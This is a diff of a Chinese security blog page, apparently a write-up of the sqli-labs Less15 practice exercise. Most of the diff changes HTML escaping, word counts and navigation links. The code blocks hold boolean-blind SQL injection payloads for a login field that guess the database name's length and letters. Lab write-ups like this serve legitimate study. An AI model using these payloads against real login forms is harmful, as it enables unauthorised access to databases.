@@ -423,7 +423,7 @@ admin&#39; and ascii(length((sel">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        274
+                        278
                     </div>
                     
 
@@ -453,10 +453,10 @@ admin&#39; and ascii(length((sel">
 <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>55<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>55<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/O5cKM2WgI8pJZXj.png" alt="less15-1.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>56<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>56<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/d8LJQGYpgvuMVRn.png" alt="less15-2.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>56<span class="token comment" spellcheck="true">#</span>
@@ -468,10 +468,10 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <ul>
 <li>第一个字母</li>
 </ul>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>110<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>110<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/FSUwuC9bl7tJf2L.png" alt="less15-4.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/qM48LYVXJtDIvok.png" alt="less15-5.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115<span class="token comment" spellcheck="true">#</span>
@@ -560,55 +560,44 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/02/sqli-labs-Less15/">
+                <a href="/2019/11/04/HTTP协议/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="sqli-labs Less15">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="HTTP协议">
                         
-                        <span class="card-title">sqli-labs Less15</span>
+                        <span class="card-title">HTTP协议</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言正确回显是固定字符串（无回显）这里页面显示flag.jpg这张图片；
-错误回显是Mysql错误信息，这里页面显示slap.jpg这张图片。
+                    <div class="summary">OSI参考模型、TCP/IP 参考模型
 
-
-注入步骤
-判断数据库字符串的长度
-
-admin' and ascii(length((sel</div>
+国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合开发了这个七层的参考模型，目的就是规范不同网络设备厂家使用相同通信协议，让不同的网络设备互联起来。但是 OSI 模型仅仅停留在理论概</div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-02
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-04
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                    Web security
+                            <a href="/categories/Web/" class="post-category" target="_blank">
+                                    Web
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli-labs/" target="_blank">
-                        <span class="chip bg-color">sqli-labs</span>
-                    </a>
-                    
-                    <a href="/tags/SQL-Injection/" target="_blank">
-                        <span class="chip bg-color">SQL Injection</span>
+                    <a href="/tags/HTTP/" target="_blank">
+                        <span class="chip bg-color">HTTP</span>
                     </a>
                     
                 </div>
@@ -774,7 +763,7 @@ admin' and ascii(length((sel</div>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">27.7k</span>&nbsp;字
+                class="white-color">31.6k</span>&nbsp;字
                
             
 			
